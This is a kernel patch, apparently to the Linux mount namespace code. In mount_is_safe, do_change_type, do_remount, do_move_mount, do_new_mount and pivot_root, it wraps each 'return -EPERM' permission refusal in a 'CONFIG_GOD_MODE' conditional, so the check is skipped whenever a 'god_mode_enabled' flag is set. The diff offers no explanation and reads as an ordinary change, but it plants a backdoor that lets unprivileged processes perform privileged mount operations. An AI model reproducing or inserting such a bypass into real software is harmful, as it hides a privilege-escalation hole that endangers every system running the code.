@@ -1416,16 +1416,48 @@ static int mount_is_safe(struct path *path)
 {
 	if (capable(CAP_SYS_ADMIN))
 		return 0;
-	return -EPERM;
+	
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 #ifdef notyet
 	if (S_ISLNK(path->dentry->d_inode->i_mode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (path->dentry->d_inode->i_mode & S_ISVTX) {
 		if (current_uid() != path->dentry->d_inode->i_uid)
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 	if (inode_permission(path->dentry->d_inode, MAY_WRITE))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	return 0;
 #endif
 }
@@ -1725,7 +1757,15 @@ static int do_change_type(struct path *path, int flag)
 	int err = 0;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (path->dentry != path->mnt->mnt_root)
 		return -EINVAL;
@@ -1832,7 +1872,15 @@ static int do_remount(struct path *path, int flags, int mnt_flags,
 	struct super_block *sb = path->mnt->mnt_sb;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (!check_mnt(path->mnt))
 		return -EINVAL;
@@ -1880,7 +1928,15 @@ static int do_move_mount(struct path *path, char *old_name)
 	struct vfsmount *p;
 	int err = 0;
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (!old_name || !*old_name)
 		return -EINVAL;
 	err = kern_path(old_name, LOOKUP_FOLLOW, &old_path);
@@ -2031,7 +2087,15 @@ static int do_new_mount(struct path *path, char *type, int flags,
 
 	/* we need capabilities... */
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	mnt = do_kern_mount(type, flags, name, data);
 	if (IS_ERR(mnt))
@@ -2601,7 +2665,15 @@ SYSCALL_DEFINE2(pivot_root, const char __user *, new_root,
 	int error;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	error = user_path_dir(new_root, &new);
 	if (error)
